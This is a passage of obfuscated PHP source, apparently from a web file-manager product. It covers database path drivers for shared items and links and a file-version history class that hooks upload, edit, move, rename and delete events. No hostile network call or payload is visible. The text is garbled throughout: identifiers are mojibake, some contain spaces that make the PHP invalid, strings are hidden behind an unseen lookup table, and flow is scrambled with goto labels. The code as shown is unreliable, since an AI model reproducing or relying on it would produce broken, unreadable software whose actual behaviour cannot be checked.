$this->infoParse($AçñÑØ¶Óä, !0); } protected function infoParse($Cˆä Òª·®, $fü‚ÿÏ¡ë∂ = false, $CÚˆãÎ√Æ≈ = false) { if (!$fü‚ÿÏ¡ë∂) { return $this->model->pathInfo($Cˆä Òª·®, $CÚˆãÎ√Æ≈); } return $this->model->pathInfoMore($Cˆä Òª·®); } public function infoFull($CÖËãªä±°) { $DÜ™†Ö ’é =& $_SERVER[ú∫]; $aÂ®òç∂å€ = explode($DÜ™†Ö ’é[8], $CÖËãªä±°); $f…∫∫∫‹± = implode($DÜ™†Ö ’é[8], array_splice($aÂ®òç∂å€, 1)); return $this->model->pathInfoByPath($aÂ®òç∂å€[0], $f…∫∫∫‹±); } public function hashSimple($cÍ∂ÚÂù¢È) { $eÜæêèÈ‚ê =& $_SERVER[ú∫]; $D°ÎÖØ≈†í = $this->infoWithChildren($cÍ∂ÚÂù¢È); return $D°ÎÖØ≈†í[$eÜæêèÈ‚ê[164]][$eÜæêèÈ‚ê[171]]; } public function hashMd5($CûÃ–¯È‚) { $a∏÷µ∞Ï“ =& $_SERVER[ú∫]; $FöÉò⁄Üì· = $this->infoWithChildren($CûÃ–¯È‚); return $FöÉò⁄Üì·[$a∏÷µ∞Ï“[164]][$a∏÷µ∞Ï“[170]]; } public function exist($bÖÇ£êå†–) { $c≈˜Íâä£© =& $_SERVER[ú∫]; $AÆ¬“úò·  = $this->parse($bÖÇ£êå†–); if (!$AÆ¬“úò· [$c≈˜Íâä£©[76]]) { return $this->isFile($bÖÇ£êå†–) || $this->isFolder($bÖÇ£êå†–); } $a„ıØëï«Î = array($c≈˜Íâä£©[394] => $AÆ¬“úò· [$c≈˜Íâä£©[393]], $c≈˜Íâä£©[28] => $AÆ¬“úò· [$c≈˜Íâä£©[76]]); $DŒ°ª’‹È© = $this->model->where($a„ıØëï«Î)->find(); return $DŒ°ª’‹È© ? !0 : !1; } public function isFile($a‚æÎ©Ò…§) { $Fõˆèª∑Àﬂ =& $_SERVER[ú∫]; $A¢ÁÏ—∆Ì≈ = $this->infoSimple($a‚æÎ©Ò…§); return $A¢ÁÏ—∆Ì≈ && $A¢ÁÏ—∆Ì≈[$Fõˆèª∑Àﬂ[403]] == $Fõˆèª∑Àﬂ[87] ? !1 : !0; } public function isFolder($D˜º”πçÉÇ) { $büâÈÆÇ˘ =& $_SERVER[ú∫]; $dÁπ¨ÍêËÓ = $this->infoSimple($D˜º”πçÉÇ); return $dÁπ¨ÍêËÓ && $dÁπ¨ÍêËÓ[$büâÈÆÇ˘[403]] == $büâÈÆÇ˘[87] ? !0 : !1; } public function listPath($dú†ü‰ÊÖÑ, $c¨áº®æ÷ç = false) { $bô¢ïÎ›˜Ú =& $_SERVER[ú∫]; if ($dú†ü‰ÊÖÑ == $bô¢ïÎ›˜Ú[33]) { return !1; } $cÎ¢»•Í◊É = array($bô¢ïÎ›˜Ú[394] => $dú†ü‰ÊÖÑ); if ($c¨áº®æ÷ç) { return $this->model->listSource($cÎ¢»•Í◊É, -1); } return $this->model->listSource($cÎ¢»•Í◊É); } public function has($d®®Ï”ùÏò, $bÛóË™∑â∆ = false, $d∏çúËúÆî = null) { $fôä∏êÚπﬁ =& $_SERVER[ú∫]; $DÜ¡Ç˘éÖ≥ = $this->infoWithChildren($d®®Ï”ùÏò); if ($bÛóË™∑â∆) { return array($fôä∏êÚπﬁ[204] => $DÜ¡Ç˘éÖ≥[$fôä∏êÚπﬁ[204]], $fôä∏êÚπﬁ[203] => $DÜ¡Ç˘éÖ≥[$fôä∏êÚπﬁ[203]]); } return $d∏çúËúÆî ? $DÜ¡Ç˘éÖ≥[$fôä∏êÚπﬁ[204]] : $DÜ¡Ç˘éÖ≥[$fôä∏êÚπﬁ[203]]; } public function listAll($AøÖ∏ïÉ¡â) { $Fœ©¯˘Ë£Í = IO::info($this->pathParse[$_SERVER[ú∫][76]]); if (!$Fœ©¯˘Ë£Í) { return array(); } return $this->model->listAll($AøÖ∏ïÉ¡â); } public function getContent($EËÍµΩéò) { return $this->model->getContent($EËÍµΩéò); } public function setContent($d≠›∞∞ªΩ”, $FáﬂâºÆÃç = '') { return $this->model->setContent($d≠›∞∞ªΩ”, $FáﬂâºÆÃç); } public function fileSubstr($B™⁄©åØ∆á, $FÖÇ√ß„ƒù, $eàüÿ•û∫é) { return $this->model->fileSubstr($B™⁄©åØ∆á, $FÖÇ√ß„ƒù, $eàüÿ•û∫é); } public function download($b¿ŒËëíıå, $F„ö“Îäûë = '') { $DÙ•ìË≤ÒÙ = get_path_father($F„ö“Îäûë); $eüÑØ¯µΩ£ = get_path_this($F„ö“Îäûë); $cÆçü¢ó¿‚ = $this->model->fileInfoGet($b¿ŒËëíıå); $bπîØ“ù≈ÿ = IO::copy($cÆçü¢ó¿‚[$_SERVER[ú∫][76]], $DÙ•ìË≤ÒÙ, !1, $eüÑØ¯µΩ£); return $bπîØ“ù≈ÿ; } public function setModifyTime($bŸ◊Èö”úÁ, $aå€›äôáØ = '') { $a≈…À“”åç =& $_SERVER[ú∫]; if (!$bŸ◊Èö”úÁ) { return; } $this->model->where(array($a≈…À“”åç[410] => $bŸ◊Èö”úÁ))->save(array($a≈…À“”åç[84] => $aå€›äôáØ)); } public function upload($D¥å¥ç∏õÇ, $CØãì⁄™Â¯, $FÓìŸ≠ßïÜ = false, $añôêàƒéï = REPEAT_REPLACE) { $aÉÜ››¡‘ =& $_SERVER[ú∫]; $cÊ⁄À‰ﬂˆù = $this->parse($D¥å¥ç∏õÇ); $a™Ç£¶∆ôä = $this->model->addFile($cÊ⁄À‰ﬂˆù[$aÉÜ››¡‘[393]], $CØãì⁄™Â¯, $cÊ⁄À‰ﬂˆù[$aÉÜ››¡‘[76]], $FÓìŸ≠ßïÜ, $añôêàƒéï); return $this->getPathOuter($a™Ç£¶∆ôä); } public function uploadFileByID($A—≈ÖõﬂÆ≥, $B≤–µÂŸéà, $E¬¿ù≤∞ùÖ) { $DÛªˆŸöá’ =& $_SERVER[ú∫]; $bå¡†…∏ÑÀ = $this->parse($A—≈ÖõﬂÆ≥); $DÖ™“•≈óí = $this->model->addFileByFileID($bå¡†…∏ÑÀ[$DÛªˆŸöá’[393]], $B≤–µÂŸéà, $bå¡†…∏ÑÀ[$DÛªˆŸöá’[76]], $E¬¿ù≤∞ùÖ); return $this->getPathOuter($DÖ™“•≈óí); } public function addFileByRemote($fà…‚áÌ≈≤, $a√Ê„ÎÊ≤©, $A‰Ëú≤äª¯ = array(), $Añ«¶¡≤≤á = '', $fÍıØ„»¯ç) { $F–ÂÕÊÊáù =& $_SERVER[ú∫]; $fõ±◊ÿÈêÒ = $this->parse($fà…‚áÌ≈≤); $Añ«¶¡≤≤á = empty($Añ«¶¡≤≤á) ? $fõ±◊ÿÈêÒ[$F–ÂÕÊÊáù[76]] : $Añ«¶¡≤≤á; $FŒóÍ√í’§ = $this->model->addFileByRemote($fõ±◊ÿÈêÒ[$F–ÂÕÊÊáù[393]], $a√Ê„ÎÊ≤©, $Añ«¶¡≤≤á, $A‰Ëú≤äª¯, $fÍıØ„»¯ç); return $this->getPathOuter($FŒóÍ√í’§); } public function uploadLink($CÃŒ∆√ÇÆ¶, $d∂˜ˆöÔÀÊ = 0) { $eÖ‡•Ô®∑í =& $_SERVER[ú∫]; $bÎêÂºÚçË = $this->parse($CÃŒ∆√ÇÆ¶); $D¬Èãˆ™¿ﬁ = _get($GLOBALS[$eÖ‡•Ô®∑í[7]], $eÖ‡•Ô®∑í[1208]); $D¡ÉΩû¡«™ = _get($GLOBALS[$eÖ‡•Ô®∑í[7]], $eÖ‡•Ô®∑í[1209]); $CÃŒ∆√ÇÆ¶ = Model($eÖ‡•Ô®∑í[571])->createFileName($bÎêÂºÚçË[$eÖ‡•Ô®∑í[76]], $D¬Èãˆ™¿ﬁ, $D¡ÉΩû¡«™); return IO::uploadLink($CÃŒ∆√ÇÆ¶, $d∂˜ˆöÔÀÊ); } public function fileNameAuto($DóœªæÍãÚ, $DÜÖçüòªî, $F›î¡ ¬È¿ = REPEAT_REPLACE, $FÔ°ﬁê„é€ = false) { return $this->model->fileNameAuto($DóœªæÍãÚ, $DÜÖçüòªî, $F›î¡ ¬È¿, $FÔ°ﬁê„é€); } public function fileNameExist($aû∫ÔÔøıΩ, $aÉÙ›±î£†) { return $this->model->fileNameExist($aû∫ÔÔøıΩ, $aÉÙ›±î£†); } protected function _fileOut($F≈«∑◊‚ÔØ, $Aë∂¡®˘™Õ = false, $b¢æòÙπÍΩ = false, $Dì‡úÙïë÷ = '', $b‰√‚êÿ√Û = false) { goto D‘’õØ°Çı; D‘’õØ°Çı: $CôÌãç„Ê™ =& $_SERVER[ú∫]; $Fàôßá„úå = $this->model->sourceInfo($F≈«∑◊‚ÔØ); if ($Fàôßá„úå[$CôÌãç„Ê™[403]] == $CôÌãç„Ê™[87]) { header($CôÌãç„Ê™[1210]); die; } goto Bïøò£≈π˜; Bïøò£≈π˜: $FÔ»òﬂÔ‚Â = $this->model->fileInfoGet($F≈«∑◊‚ÔØ); $Dì‡úÙïë÷ = $FÔ»òﬂÔ‚Â[$CôÌãç„Ê™[170]] ? $FÔ»òﬂÔ‚Â[$CôÌãç„Ê™[170]] : $Dì‡úÙïë÷; $dÜ¡Îı∂Ú≠ = isset($GLOBALS[$CôÌãç„Ê™[1211]]) ? $GLOBALS[$CôÌãç„Ê™[1211]] : $Fàôßá„úå[$CôÌãç„Ê™[28]]; goto aΩÂÈ‰≤≥Ô; aΩÂÈ‰≤≥Ô: if ($b‰√‚êÿ√Û) { return IO::fileOutServer($FÔ»òﬂÔ‚Â[$CôÌãç„Ê™[76]], $Aë∂¡®˘™Õ, $dÜ¡Îı∂Ú≠, $Dì‡úÙïë÷); } IO::fileOut($FÔ»òﬂÔ‚Â[$CôÌãç„Ê™[76]], $Aë∂¡®˘™Õ, $dÜ¡Îı∂Ú≠, $Dì‡úÙïë÷); goto FÚ¡ÑàûËﬁ; FÚ¡ÑàûËﬁ: } public function fileOut($cèèÇ≥ì©È, $F≠ú±À–§∞ = false, $bÀˆÛ—ô…Û = false, $Eà€Âáœ∂Æ = '') { $this->_fileOut($cèèÇ≥ì©È, $F≠ú±À–§∞, $bÀˆÛ—ô…Û, $Eà€Âáœ∂Æ); } public function fileOutServer($Eê©Û¬Ãäº, $A·ÉΩ’Öªˆ = false, $eÁà±†òó° = false, $E‡ù¿òñô˘ = '') { $this->_fileOut($Eê©Û¬Ãäº, $A·ÉΩ’Öªˆ, $eÁà±†òó°, $E‡ù¿òñô˘, !0); } protected function _fileOutImage($eÔàˆõ‚πÉ, $fˆèØ√˜”ø = 250) { goto FÆ≤È∫äÉÎ; f¯ñß°Á±†: $GLOBALS[$Fñãì¶ê¿±[1211]] = $e†úöÑççﬂ[$Fñãì¶ê¿±[28]]; $GLOBALS[$Fñãì¶ê¿±[162]] = $e†úöÑççﬂ; IO::fileOutImage($e†úöÑççﬂ[$Fñãì¶ê¿±[76]], $fˆèØ√˜”ø); goto C›Øøƒœ¶‚; FÆ≤È∫äÉÎ: $Fñãì¶ê¿± =& $_SERVER[ú∫]; $A£¨ë°≠Øœ = $this->model->pathInfo($eÔàˆõ‚πÉ); if ($A£¨ë°≠Øœ[$Fñãì¶ê¿±[403]] == $Fñãì¶ê¿±[87]) { show_json($Fñãì¶ê¿±[1212] . $eÔàˆõ‚πÉ, !1); } goto aÎ¨é∏∆ÕÒ; aÎ¨é∏∆ÕÒ: $e†úöÑççﬂ = $this->model->fileInfoGet($eÔàˆõ‚πÉ); $e†úöÑççﬂ[$Fñãì¶ê¿±[28]] = $A£¨ë°≠Øœ[$Fñãì¶ê¿±[28]]; $e†úöÑççﬂ[$Fñãì¶ê¿±[163]] = $A£¨ë°≠Øœ[$Fñãì¶ê¿±[163]]; goto f¯ñß°Á±†; C›Øøƒœ¶‚: } public function fileOutImage($AÙÇ÷êûÈ¯, $C´∂ ß—º¡ = 250) { $this->_fileOutImage($AÙÇ÷êûÈ¯, $C´∂ ß—º¡); } public function fileOutImageServer($f•€¿œ°∆∂, $Bã„µÆ´ À = 250) { $this->_fileOutImage($f•€¿œ°∆∂, $Bã„µÆ´ À); } public function link($c‚ﬁÇ˘ó–µ, $D„Ï¨†¢›Î = '') { $aÊÍÖëÑÒß = $this->model->fileInfoGet($c‚ﬁÇ˘ó–µ); return IO::link($aÊÍÖëÑÒß[$_SERVER[ú∫][76]], $D„Ï¨†¢›Î); } protected function parse($Eá¥öÜ¶Çπ) { $d¿∆ØÇßâÒ =& $_SERVER[ú∫]; if (strstr($Eá¥öÜ¶Çπ, $d¿∆ØÇßâÒ[8]) === !1) { return array($d¿∆ØÇßâÒ[412] => intval($Eá¥öÜ¶Çπ), $d¿∆ØÇßâÒ[76] => $d¿∆ØÇßâÒ[33], $d¿∆ØÇßâÒ[1207] => array()); } $C«Ì›éïπù = explode($d¿∆ØÇßâÒ[8], trim($Eá¥öÜ¶Çπ, $d¿∆ØÇßâÒ[8])); if (count($C«Ì›éïπù) < 2) { show_tips($Eá¥öÜ¶Çπ . $d¿∆ØÇßâÒ[1213]); } return array($d¿∆ØÇßâÒ[412] => intval($C«Ì›éïπù[0]), $d¿∆ØÇßâÒ[76] => $C«Ì›éïπù[1], $d¿∆ØÇßâÒ[1207] => array_slice($C«Ì›éïπù, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($dêÿÕÍ–¬Ü) { $this->pathParse = $dêÿÕÍ–¬Ü; $this->model = Model($_SERVER[ú∫][1206]); } public function getPathOuter($e◊„≤ÖÓ€) { $F∞®ãÑ„Ü€ =& $_SERVER[ú∫]; if (!$e◊„≤ÖÓ€) { return $e◊„≤ÖÓ€; } $Eï¿ÍÿÇÚ¢ = $this->parse($e◊„≤ÖÓ€); return trim(KodIO::makeShare($this->pathParse[$F∞®ãÑ„Ü€[393]], $Eï¿ÍÿÇÚ¢[$F∞®ãÑ„Ü€[393]]), $F∞®ãÑ„Ü€[8]); } protected function infoParse($cíØé¶áä, $Fô”Üô‹…· = false, $CÈùì¶ë‡À = false) { $f…¯ª¢ê›∫ =& $_SERVER[ú∫]; $b¨Ø˘™Üµ› = $this->pathParse[$f…¯ª¢ê›∫[393]]; $Cúõ†€∞¨á = trim($this->pathParse[$f…¯ª¢ê›∫[1064]], $f…¯ª¢ê›∫[8]); return Action($f…¯ª¢ê›∫[1214])->sharePathInfo($b¨Ø˘™Üµ›, $Cúõ†€∞¨á); } public function infoFull($Eãä‹’“çû) { $CıÑ—‡£´Á =& $_SERVER[ú∫]; $CíúΩ⁄Øπ≠ = explode($CıÑ—‡£´Á[8], trim($Eãä‹’“çû, $CıÑ—‡£´Á[8])); if (count($CíúΩ⁄Øπ≠) > 1) { $d‹ôå´∆‘¿ = implode($CıÑ—‡£´Á[8], array_splice($CíúΩ⁄Øπ≠, 1)); $A≥ºæ˜ºòﬂ = $this->model->pathInfoByPath($CíúΩ⁄Øπ≠[0], $d‹ôå´∆‘¿); if (!$A≥ºæ˜ºòﬂ) { return !1; } $this->pathParse[$CıÑ—‡£´Á[1064]] = $A≥ºæ˜ºòﬂ[$CıÑ—‡£´Á[395]]; } return $this->infoParse($Eãä‹’“çû); } public function listAll($A¬®ï›©Âõ) { goto Déâö‰´òã; Déâö‰´òã: $cÕıßä“≈ñ =& $_SERVER[ú∫]; $D∞Î—ÊıçÇ = IO::info($this->pathParse[$cÕıßä“≈ñ[76]]); if (!$D∞Î—ÊıçÇ) { return array(); } goto f„Ïä¯Ïí∑; f„Ïä¯Ïí∑: $f‘è€Ì∆Ø∞ = $this->model->listAll($A¬®ï›©Âõ); $eÏ©ê≠áÏ± = Model($cÕıßä“≈ñ[563])->getInfo($D∞Î—ÊıçÇ[$cÕıßä“≈ñ[468]]); $C‹‰⁄¨úä∫ = Action($cÕıßä“≈ñ[1214]); goto Aœã™üß∂â; Aœã™üß∂â: foreach ($f‘è€Ì∆Ø∞ as &$Bò∏¡õÆÈ) { check_abort(); $Bò∏¡õÆÈ[$cÕıßä“≈ñ[85]] = $C‹‰⁄¨úä∫->_shareItemeParse($Bò∏¡õÆÈ[$cÕıßä“≈ñ[85]], $eÏ©ê≠áÏ±); } unset($Bò∏¡õÆÈ); return $f‘è€Ì∆Ø∞; goto fÛã‹øû¨∑; fÛã‹øû¨∑: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($fÇ±ÏÌëêÂ) { $this->pathParse = $fÇ±ÏÌëêÂ; $this->model = Model($_SERVER[ú∫][1206]); } protected function infoParse($bªíØﬂê≤¿, $a·πÔ·ãê° = false, $b…Ê¿ƒœªµ = false) { $B˘üå‰ûÎ∂ =& $_SERVER[ú∫]; return Action($B˘üå‰ûÎ∂[1070])->sharePathInfo($this->pathParse[$B˘üå‰ûÎ∂[76]], !0); } public function listPath($dçé‹®£—ª, $a´ÿ◊®Áè≥ = false) { $F≤ƒÑü◊‡ü =& $_SERVER[ú∫]; $A˜Ò◊†ùèû = parent::listPath($dçé‹®£—ª, $a´ÿ◊®Áè≥); foreach ($A˜Ò◊†ùèû as $FŒÕ∂≥âÇÎ => $A∂éè◊ﬁπÓ) { if (!in_array($FŒÕ∂≥âÇÎ, array($F≤ƒÑü◊‡ü[74], $F≤ƒÑü◊‡ü[75]))) { continue; } foreach ($A∂éè◊ﬁπÓ as $F¨ÌÇù˘˘ë => $cºàìåÔﬂÉ) { $A˜Ò◊†ùèû[$FŒÕ∂≥âÇÎ][$F¨ÌÇù˘˘ë] = Action($F≤ƒÑü◊‡ü[1070])->shareItemInfo($cºàìåÔﬂÉ); } } return $A˜Ò◊†ùèû; } public function listAll($eÑ—§Ñ£ä≈) { goto b—óÈ–Ú¬∏; E”æçà§¨ç: $f¡—êØÁπ£ = $this->model->listAll($eÑ—§Ñ£ä≈); foreach ($f¡—êØÁπ£ as &$Fì˘ﬂÔÇ—Á) { $Fì˘ﬂÔÇ—Á[$báó⁄Ùñêå[85]] = Action($báó⁄Ùñêå[1070])->shareItemInfo($Fì˘ﬂÔÇ—Á[$báó⁄Ùñêå[85]]); } unset($Fì˘ﬂÔÇ—Á); goto CﬁÂÜΩå–ú; CﬁÂÜΩå–ú: return $f¡—êØÁπ£; goto F√¨ÊªòÃ«; b—óÈ–Ú¬∏: $báó⁄Ùñêå =& $_SERVER[ú∫]; $aÁÈÛ±≤«è = IO::info($this->pathParse[$báó⁄Ùñêå[76]]); if (!$aÁÈÛ±≤«è) { return array(); } goto E”æçà§¨ç; F√¨ÊªòÃ«: } } goto Aµ£Í ÖıÖ; aÇÓπ¡¿å∏: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto bêãü¶ãï•; c›¢èÿæ»‚: if ($B©ü†ÖÔà˘[$BΩ⁄”§Ò‰û[1104]] <= 0) { return; } if (isset($_REQUEST[$BΩ⁄”§Ò‰û[1105]]) && $_REQUEST[$BΩ⁄”§Ò‰û[1105]] == $BΩ⁄”§Ò‰û[87]) { return; } Hook::bind($BΩ⁄”§Ò‰û[1106], $BΩ⁄”§Ò‰û[1107]); goto A÷–ÿôıÙ÷; bêãü¶ãï•: $BΩ⁄”§Ò‰û =& $_SERVER[ú∫]; $B©ü†ÖÔà˘ = $GLOBALS[$BΩ⁄”§Ò‰û[6]][$BΩ⁄”§Ò‰û[88]]; if ($B©ü†ÖÔà˘[$BΩ⁄”§Ò‰û[1103]] != 1) { return; } goto c›¢èÿæ»‚; Cº≤ıà¥ß–: Hook::bind($BΩ⁄”§Ò‰û[1114], $BΩ⁄”§Ò‰û[1115]); Hook::bind($BΩ⁄”§Ò‰û[1116], $BΩ⁄”§Ò‰û[1117]); goto CÍâá∑Ô∂Û; A÷–ÿôıÙ÷: Hook::bind($BΩ⁄”§Ò‰û[1108], $BΩ⁄”§Ò‰û[1109]); Hook::bind($BΩ⁄”§Ò‰û[1110], $BΩ⁄”§Ò‰û[1111]); Hook::bind($BΩ⁄”§Ò‰û[1112], $BΩ⁄”§Ò‰û[1113]); goto Cº≤ıà¥ß–; CÍâá∑Ô∂Û: } public static function eventBeforeUpload($d´ìßì–úË) { if ($d´ìßì–úË[3] && $d´ìßì–úË[3] != REPEAT_REPLACE) { return; } $Dà‰èê∫´¡ = self::parsePath($d´ìßì–úË[0]); if (!$Dà‰èê∫´¡) { return; } self::add($Dà‰èê∫´¡); } public static function eventBeforeEdit($Eëç≈ö±†ë) { $bíΩ¿õâ’ß = self::parsePath($Eëç≈ö±†ë[0]); if (!$bíΩ¿õâ’ß) { return; } self::add($bíΩ¿õâ’ß); } public static function eventBeforeCopyFile($C Ø®±™…∑, $AøÎ≤•ëﬁœ, $dâ¡àÚ€√å, $DŒ¿ßÆêÌÌ, $C—∫ˆªÑè´, $CÖﬂã≤≤—¶) { $BﬁÏÖñ≥∫É = $dâ¡àÚ€√å->getPathOuter($DŒ¿ßÆêÌÌ); $Dÿ§åÏå†» = self::parsePath($BﬁÏÖñ≥∫É); if (!$Dÿ§åÏå†») { return; } self::add($Dÿ§åÏå†»); } public static function eventBeforeRename($a…Ñ∫Ú¬å) { $eÁ’®€Œ€Ñ =& $_SERVER[ú∫]; $e¯•ΩúÆ‡Æ = self::parsePath($a…Ñ∫Ú¬å[0]); if (!$e¯•ΩúÆ‡Æ) { return; } $fŒ•œñ°Ô = self::checkInHistory($e¯•ΩúÆ‡Æ); if (!$fŒ•œñ°Ô) { return; } if ($fŒ•œñ°Ô[$eÁ’®€Œ€Ñ[29]] == $eÁ’®€Œ€Ñ[193]) { $e®ß§µ»õë = self::listData($e¯•ΩúÆ‡Æ); if ($e®ß§µ»õë && $e®ß§µ»õë[$eÁ’®€Œ€Ñ[367]]) { self::moveHistory($e¯•ΩúÆ‡Æ, $a…Ñ∫Ú¬å[1]); } } else { IO::rename($fŒ•œñ°Ô[$eÁ’®€Œ€Ñ[76]], $a…Ñ∫Ú¬å[1]); } } public static function eventBeforeMove($Bπá„·¡Ñ≈) { goto Fı‚üÚÁê; aıÉüÑÿ Æ: $C≥πÖ∑ÆÍÒ = self::parsePath($Bπá„·¡Ñ≈[1]); if (!$C≥πÖ∑ÆÍÒ) { return; } $FÑΩ‘Öé◊Ñ = $Bπá„·¡Ñ≈[3]; goto d˜¢ß£πóÃ; Fı‚üÚÁê: $fë¿Õı∑ñ© =& $_SERVER[ú∫]; $aî™‡ÎÂëÎ = self::parsePath($Bπá„·¡Ñ≈[0]); if (!$aî™‡ÎÂëÎ) { return; } goto aıÉüÑÿ Æ; d˜¢ß£πóÃ: $DóΩµÊ›Îâ = self::checkInHistory($aî™‡ÎÂëÎ); if (!$DóΩµÊ›Îâ) { return; } $e¶≠Òßƒè = self::pathHistory($C≥πÖ∑ÆÍÒ); goto DÆ—‰†¢é«; DÆ—‰†¢é«: if ($DóΩµÊ›Îâ[$fë¿Õı∑ñ©[29]] == $fë¿Õı∑ñ©[193]) { $AÂÈèÿê„ƒ = self::listData($aî™‡ÎÂëÎ); $cÁ¡ì€ƒ±ä = rtrim($C≥πÖ∑ÆÍÒ, $fë¿Õı∑ñ©[8]) . $fë¿Õı∑ñ©[8] . ($FÑΩ‘Öé◊Ñ ? $FÑΩ‘Öé◊Ñ : get_path_this($aî™‡ÎÂëÎ)); $CÑ–áÁ∏çà = self::listData($cÁ¡ì€ƒ±ä); if ($AÂÈèÿê„ƒ && $AÂÈèÿê„ƒ[$fë¿Õı∑ñ©[367]] && $CÑ–áÁ∏çà && $CÑ–áÁ∏çà[$fë¿Õı∑ñ©[367]]) { return self::clear($aî™‡ÎÂëÎ); } if ($AÂÈèÿê„ƒ && $AÂÈèÿê„ƒ[$fë¿Õı∑ñ©[367]]) { self::moveHistory($aî™‡ÎÂëÎ, $FÑΩ‘Öé◊Ñ, $e¶≠Òßƒè); } } else { IO::move($DóΩµÊ›Îâ[$fë¿Õı∑ñ©[76]], $e¶≠Òßƒè, !1, $FÑΩ‘Öé◊Ñ); self::clearEmptyFolder(IO::pathFather($DóΩµÊ›Îâ[$fë¿Õı∑ñ©[76]])); } goto D§≈Ì›’¯Ö; D§≈Ì›’¯Ö: } public static function eventAfterRemove($Fë”ïå¡Ωß, $CËå®˘¬Û£) { goto CÜ•‡¨çÓñ; Bô≥‡ Øêä: if ($Cä¨÷Ã¨∞Œ[$Fá†‹Á´€◊[29]] == $Fá†‹Á´€◊[193]) { $EÃ»ô¶æ©ï = self::listData($FﬂôÜÉﬁ—´, !1); if ($EÃ»ô¶æ©ï && $EÃ»ô¶æ©ï[$Fá†‹Á´€◊[367]]) { self::clear($FﬂôÜÉﬁ—´, !1); } } else { IO::remove($Cä¨÷Ã¨∞Œ[$Fá†‹Á´€◊[76]]); self::clearEmptyFolder(IO::pathFather($Cä¨÷Ã¨∞Œ[$Fá†‹Á´€◊[76]])); } goto dùàÍÿàâﬁ; CÜ•‡¨çÓñ: $Fá†‹Á´€◊ =& $_SERVER[ú∫]; if (!$CËå®˘¬Û£) { return; } $FﬂôÜÉﬁ—´ = self::parsePath($Fë”ïå¡Ωß[0]); goto e—¨Ò‰ïÁ›; e—¨Ò‰ïÁ›: if (!$FﬂôÜÉﬁ—´) { return; } $Cä¨÷Ã¨∞Œ = self::checkInHistory($FﬂôÜÉﬁ—´); if (!$Cä¨÷Ã¨∞Œ) { return; } goto Bô≥‡ Øêä; dùàÍÿàâﬁ: } private static function checkInHistory($DíôÚÇ± ) { $E˜≤Î°ºÍô = self::pathHistory($DíôÚÇ± ); if (!IO::exist($E˜≤Î°ºÍô)) { $E˜≤Î°ºÍô .= $_SERVER[ú∫][1118]; } return IO::exist($E˜≤Î°ºÍô) ? IO::info($E˜≤Î°ºÍô) : !1; } private static function parsePath($d∑é“»Òàä) { goto B»‡—≥éäÍ; BÁÛ◊¶åù•: self::log($GLOBALS[$eñ∞î‡¢±¯[1043]] . $eñ∞î‡¢±¯[1123] . $d∑é“»Òàä); return $d∑é“»Òàä; goto C…¿æÒÜﬁä; B»‡—≥éäÍ: $eñ∞î‡¢±¯ =& $_SERVER[ú∫]; if (!$d∑é“»Òàä) { return !1; } if ($GLOBALS[$eñ∞î‡¢±¯[1119]]) { return; } goto a„≥¨ß∑œÙ; a„≥¨ß∑œÙ: $FΩÒÛΩÁ∫∏ = KodIO::parse($d∑é“»Òàä); $B‡‘¡·çœô = $FΩÒÛΩÁ∫∏[$eñ∞î‡¢±¯[29]]; $FÛÜ–®∂› = !$B‡‘¡·çœô || $B‡‘¡·çœô == KodIO::KOD_IO || $B‡‘¡·çœô == KodIO::KOD_SHARE_ITEM; goto a£ÿœêÙ„®; b∏·µâ‘†â: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $eï⁄‚ÉâÖÁ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $eñ∞î‡¢±¯[1122]); foreach ($eï⁄‚ÉâÖÁ as $cåãê’Õ∫˘) { if (!$B‡‘¡·çœô && substr($d∑é“»Òàä, 0, strlen($cåãê’Õ∫˘)) == $cåãê’Õ∫˘) { return !1; } } goto BÁÛ◊¶åù•; a£ÿœêÙ„®: if (!$FÛÜ–®∂› || !$FΩÒÛΩÁ∫∏[$eñ∞î‡¢±¯[1120]]) { return !1; } if (substr($d∑é“»Òàä, 0, strlen(DATA_PATH . $eñ∞î‡¢±¯[1121])) == DATA_PATH . $eñ∞î‡¢±¯[1121]) { return !1; } if ($B‡‘¡·çœô == KodIO::KOD_SHARE_ITEM) { $f∫‰ìå·ÀÓ = IO::init($d∑é“»Òàä); if ($f∫‰ìå·ÀÓ->pathParse[$eñ∞î‡¢±¯[1048]]) { return self::parsePath($f∫‰ìå·ÀÓ->pathParse[$eñ∞î‡¢±¯[1048]]); } return !1; } goto b∏·µâ‘†â; C…¿æÒÜﬁä: } private static function pathHistory($dÊè√œ˜÷¬) { $C´Î›Ωâøç =& $_SERVER[ú∫]; $cËô‡æ’Üª = self::$_historyBase . ltrim(KodIO::clear($dÊè√œ˜÷¬), $C´Î›Ωâøç[8]); $cËô‡æ’Üª = str_replace(array($C´Î›Ωâøç[1124]), array($C´Î›Ωâøç[1125]), $cËô‡æ’Üª); return $cËô‡æ’Üª; } public static function log($Cˆï¢Õ√ï◊) { } public static function historyCount($Aà±‘£óΩµ) { $AÊÙ„¿ÛøÍ =& $_SERVER[ú∫]; $aó∑®„û…â = array(); $cŸ≠ÿç©ﬂá = array(); foreach ($Aà±‘£óΩµ as $A¥ÔöÛÇáë) { $Eö·∫Îï§” = get_path_father($A¥ÔöÛÇáë); if (!$cŸ≠ÿç©ﬂá[$Eö·∫Îï§”]) { $cŸ≠ÿç©ﬂá[$Eö·∫Îï§”] = array(); } $cŸ≠ÿç©ﬂá[$Eö·∫Îï§”][] = get_path_this($A¥ÔöÛÇáë); } foreach ($cŸ≠ÿç©ﬂá as $Eö·∫Îï§” => $bº⁄ßÍÉ) { $f≈·Û∑¢˜â = self::parsePath($Eö·∫Îï§”); if (!$f≈·Û∑¢˜â) { continue; } foreach ($bº⁄ßÍÉ as $bÜä˜Óçí—) { $c›õÏ™Ëû≠ = self::listData(rtrim($f≈·Û∑¢˜â, $AÊÙ„¿ÛøÍ[8]) . $AÊÙ„¿ÛøÍ[8] . $bÜä˜Óçí—, !1); if ($c›õÏ™Ëû≠ && $c›õÏ™Ëû≠[$AÊÙ„¿ÛøÍ[367]]) { $aó∑®„û…â[rtrim($Eö·∫Îï§”, $AÊÙ„¿ÛøÍ[8]) . $AÊÙ„¿ÛøÍ[8] . $bÜä˜Óçí—] = count($c›õÏ™Ëû≠[$AÊÙ„¿ÛøÍ[367]]); } } } return $aó∑®„û…â; } public static function add($F£Û√®èÏ¨) { goto aÈÒ≥»ìåà; cÛ≥¨íé÷ó: $c›ÿºÕÖ◊Õ = 